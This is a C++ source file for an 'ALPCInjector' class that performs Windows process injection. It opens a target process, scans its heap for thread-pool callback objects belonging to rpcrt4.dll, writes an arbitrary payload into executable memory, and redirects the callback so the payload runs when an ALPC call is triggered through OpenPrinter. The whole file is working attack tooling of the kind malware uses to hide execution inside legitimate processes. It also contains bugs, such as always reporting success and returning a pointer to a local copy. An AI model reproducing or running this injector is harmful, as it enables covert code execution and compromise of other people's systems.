#include <iostream>
#include <vector>
#include <optional>
#include <fstream>
#include <windows.h>
#include <tlhelp32.h>
#include <functional>
#include <Psapi.h>
#include <nttpp.h>

#include "ALPCInjector.hpp"

/**
 * The ALPCInjector::Inject function opens a process, iterates through its sections to find a callback
 * function, and executes a payload if the callback function is found.
 *
 * @param PID The PID parameter is the process ID of the target process into which the payload will be
 * injected.
 * @param payload The payload is a vector of unsigned characters, which typically represents the binary
 * code or data that will be injected into the target process.
 *
 * @return an object of type `InjectionResult`.
 */
InjectionResult ALPCInjector::Inject(DWORD PID, std::vector<unsigned char> payload)
{

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (!hProcess)
        return InjectionResult::INVALID_PROC_HANDLE;

    IterateSections([&](MEMORY_BASIC_INFORMATION section)
                    {
        auto callback = FindCallback(section);
        if (callback.has_value()){
            std::cout << "Got valid callback location at " << callback.value().first << std::endl;
            if (ExecutePayload(callback.value().first, callback.value().second, payload))
                return true;
        }

        return false; });

    //std::cout << "Failed to execute payload in any sections!" << std::endl;
    return InjectionResult::SUCESFULLY;
}

/**
 * The IterateSections function iterates through the sections of a process's memory and calls a
 * provided function for each section that meets certain criteria.
 *
 * @param function The `function` parameter is a `std::function` object that takes a
 * `MEMORY_BASIC_INFORMATION` parameter and returns a `bool` value. It is used to iterate over the
 * sections of memory in a process and perform some action on each section. The `function` is called
 * for each section
 */
void ALPCInjector::IterateSections(const std::function<bool(MEMORY_BASIC_INFORMATION)> &function)
{
    SYSTEM_INFO si;
    MEMORY_BASIC_INFORMATION mbi;
    LPBYTE addr;
    SIZE_T res;

    // if process opened
    if (hProcess != NULL)
    {
        // get memory info
        GetSystemInfo(&si);

        for (addr = 0; addr < (LPBYTE)si.lpMaximumApplicationAddress;)
        {
            ZeroMemory(&mbi, sizeof(mbi));
            res = VirtualQueryEx(hProcess, addr, &mbi, sizeof(mbi));

            // we only want to scan the heap, but this will scan stack space too.
            // need to fix that..
            if ((mbi.State == MEM_COMMIT) &&
                (mbi.Type == MEM_PRIVATE) &&
                (mbi.Protect == PAGE_READWRITE))
            {
                // exists when iterated function return true
                if (function(mbi))
                    break;
            }
            addr = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
        }
        CloseHandle(hProcess);
    }
}

bool ALPCInjector::IsValidTCO(PTP_CALLBACK_OBJECT tco)
{
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T res;

    // if it's a callback, these values shouldn't be empty
    if (tco->CleanupGroupMember == NULL ||
        tco->Pool == NULL ||
        tco->CallerAddress.Function == NULL ||
        tco->Callback.Function == NULL)
        return FALSE;

    // the CleanupGroupMember should reside in read-only
    // area of image
    res = VirtualQueryEx(hProcess,
                         (LPVOID)tco->CleanupGroupMember, &mbi, sizeof(mbi));

    if (res != sizeof(mbi))
        return FALSE;
    if (!(mbi.Protect & PAGE_READONLY))
        return FALSE;
    if (!(mbi.Type & MEM_IMAGE))
        return FALSE;

    // the pool object should reside in read+write memory
    res = VirtualQueryEx(hProcess,
                         (LPVOID)tco->Pool, &mbi, sizeof(mbi));

    if (res != sizeof(mbi))
        return FALSE;
    if (!(mbi.Protect & PAGE_READWRITE))
        return FALSE;

    // the caller address  should reside in read+executable memory
    res = VirtualQueryEx(hProcess,
                         (LPCVOID)tco->CallerAddress.Function, &mbi, sizeof(mbi));

    if (res != sizeof(mbi))
        return FALSE;
    if (!(mbi.Protect & PAGE_EXECUTE_READ))
        return FALSE;

    // the callback function should reside in read+executable memory
    res = VirtualQueryEx(hProcess,
                         (LPCVOID)tco->Callback.Function, &mbi, sizeof(mbi));

    if (res != sizeof(mbi))
        return FALSE;
    return (mbi.Protect & PAGE_EXECUTE_READ);
}

/**
 * The function searches for a callback object in a specified memory region and returns its address and
 * pointer if found.
 * 
 * @param mbi The parameter `mbi` is of type `MEMORY_BASIC_INFORMATION` and represents information
 * about a region of memory. It is used to determine the start address and size of the memory region to
 * be searched for a callback.
 * 
 * @return an optional object that contains a pair of a void pointer and a PTP_CALLBACK_OBJECT pointer.
 */
std::optional<std::pair<void *, PTP_CALLBACK_OBJECT>> ALPCInjector::FindCallback(MEMORY_BASIC_INFORMATION mbi)
{
    LPBYTE addr = (LPBYTE)mbi.BaseAddress;

    std::cout << "Searching callback on section from " << (void*)addr << " to " <<  (void*)(addr + mbi.RegionSize) << std::endl;

    size_t pos;
    bool bRead, bFound = FALSE;
    size_t rd;
    TP_CALLBACK_OBJECT tco;
    char filename[MAX_PATH];

    // scan memory for TCO
    for (pos = 0; pos < mbi.RegionSize;
         pos += (bFound ? sizeof(tco) : sizeof(ULONG_PTR)))
    {
        bFound = FALSE;
        // try read TCO from writeable memory
        bRead = ReadProcessMemory(hProcess,
                                  &addr[pos], &tco, sizeof(TP_CALLBACK_OBJECT), &rd);

        // if not read, continue
        if (!bRead)
            continue;
        // if not size of callback environ, continue
        if (rd != sizeof(TP_CALLBACK_OBJECT))
            continue;

        // is this a valid TCO?
        if (IsValidTCO(&tco))
        {
            // if this object resides in RPCRT4.dll, try use
            // it for process injection
            ZeroMemory(filename, ARRAYSIZE(filename));
            GetMappedFileName(hProcess,
                              (LPVOID)tco.Callback.Function, filename, MAX_PATH);

            std::cout << "got valid tco on filename " << std::string(filename) << std::endl;
            if (std::string(filename).find("rpcrt4.dll") != std::string::npos){
                std::cout << "Found RPCRT4.dll map file!" << std::endl;
                return { std::pair<void *, PTP_CALLBACK_OBJECT>(addr + pos, &tco)};
            }
        }
    }
    return {};
}

bool ALPCInjector::ExecutePayload(void *address, PTP_CALLBACK_OBJECT tco, std::vector<unsigned char> buffer)
{
    std::cout << "Trying to execute payload at addr " << address  << std::endl;
    LPVOID cs = NULL;
    bool bStatus = false;
    TP_CALLBACK_OBJECT cpy;
    TP_SIMPLE_CALLBACK tp;
    SIZE_T wr;
    HANDLE phPrinter = NULL;

    // allocate memory in remote for payload and callback parameter
    cs = VirtualAllocEx(hProcess, NULL, buffer.size() + sizeof(TP_SIMPLE_CALLBACK),
                        MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (cs == nullptr){
        std::cout << "Couldn't not allocate memory in target process (hProcess:" << (int)hProcess << ")" << std::endl;
        return false;
    }

    std::cout << "Alocated memory in remote process at " << cs << std::endl;
    if (cs != NULL)
    {
        // write payload to remote process
        WriteProcessMemory(hProcess, cs, buffer.data(), buffer.size(), &wr);
        // backup original callback object
        CopyMemory(&cpy, tco, sizeof(TP_CALLBACK_OBJECT));
        // copy original callback address and parameter
        tp.Function = cpy.Callback.Function;
        tp.Context = cpy.Callback.Context;
        // write callback+parameter to remote process
        WriteProcessMemory(hProcess, (LPBYTE)cs + buffer.size(), &tp, sizeof(tp), &wr);
        // update original callback with address of payload and parameter
        cpy.Callback.Function = cs;
        cpy.Callback.Context = (LPBYTE)cs + buffer.size();
        // update callback object in remote process
        WriteProcessMemory(hProcess, address, &cpy, sizeof(cpy), &wr);
        // trigger execution of payload
        if (OpenPrinter(NULL, &phPrinter, NULL))
            ClosePrinter(phPrinter);
        
        // read back the TCO
        ReadProcessMemory(hProcess, address, &cpy, sizeof(cpy), &wr);
        // restore the original tco
        WriteProcessMemory(hProcess, address, tco, sizeof(cpy), &wr);
        // if callback pointer is the original, we succeeded.
        bStatus = (cpy.Callback.Function == tco->Callback.Function);
        // release memory for payload
        VirtualFreeEx(hProcess, cs, buffer.size(), MEM_RELEASE);
    }
    return true;
}